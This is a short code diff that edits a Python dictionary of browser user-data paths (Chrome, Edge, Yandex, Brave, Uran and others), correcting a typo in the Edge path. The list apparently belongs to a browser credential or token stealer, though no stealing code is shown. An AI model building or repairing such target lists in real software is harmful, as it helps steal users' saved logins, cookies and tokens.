@@ -39,7 +39,7 @@ PATHS = {
     'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
     'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
     'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
-    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
     'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
     'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
     'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
